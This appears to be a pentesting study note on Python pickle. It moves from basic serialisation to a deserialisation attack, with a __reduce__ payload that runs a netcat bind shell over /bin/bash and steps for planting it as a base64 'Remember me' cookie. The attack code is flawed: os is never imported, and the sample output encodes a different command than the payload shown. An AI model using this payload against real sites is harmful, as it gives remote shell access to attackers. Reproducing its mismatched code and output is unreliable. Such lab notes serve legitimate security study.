# Python Pickle

Serialisation of object is used by application to make their storage  easier. If an application needs to store an instance of a class, it can  use serialisation to get a byte string representation of this object. When  the application needs to use the instance again, it will unserialise the string to get it.

[Python Script](pickle_code.py)

### Syntax Pickle

```python
import pickle
# initializing data to be stored in db 
Omkar = {'key' : 'Omkar', 'name' : 'Omkar Pathak',  
'age' : 21, 'pay' : 40000} 
Jagdish = {'key' : 'Jagdish', 'name' : 'Jagdish Pathak', 
'age' : 50, 'pay' : 50000} 
  
# database 
db = {} 
db['Omkar'] = Omkar 
db['Jagdish'] = Jagdish 
  
# For storing 
b = pickle.dumps(db)       # type(b) gives <class 'bytes'> 
  
# For loading 
myEntry = pickle.loads(b) 
print(myEntry) 

```

* Creating your own class and serialise it:

  ```python
  import pickle
  class Hack:
    def __init__(self):
      self.test1 = "test"  
      self.test2 = "retest"  
  
  h = Hack()
  b = pickle.dumps(h)
  ```

### Code execution with Pickle

* we will need to create a malicious object. The following example creates an object that will bind a shell on port `1234` and run `/bin/bash`

  ```python
  import pickle
  class Blah(object):
    def __reduce__(self):
      return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
  
  h = Blah()
  print(pickle.dumps(h))
  ```
  
* `__reduce__` function returns in **tuple** or **string** 



### Finding where website uses pickle

* using proxy burpsuite we see that when we check `Remember me` it is base64 encoded in its **cookie** in response.

  if we decode it we see:

  ```
  (lp1
  Vabcd
  p2
  aS'44c6c8f44cfa3eb6c86db220969349fa'
  p3
  a.
  ```

  this response proves it is using **cPickle** the python2 version of **pickle** 
  
* so we will use this code:

  ```python
  import cPickle as pickle
  class Blah(object):
    def __reduce__(self):
      return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
  
  h = Blah()
  print(pickle.dumps(h))
  ```

  which gives response like:

  ```
  cposix
  system
  p1
  (S'/usr/local/bin/score c6ff9c86-7094-459f-8d08-41d717b9e508'
  p2
  tp3
  Rp4
  .
  ```

  Now we will base64 encode this response

* then we will inspect the element and in the storage section we will change the **cache value of remember me** to this base64 encoded response.

  if we now reload the page we see that it won't work as remember me cache function will only work when there is not previous session in existence

  So we will delete the session cache and now reload the page.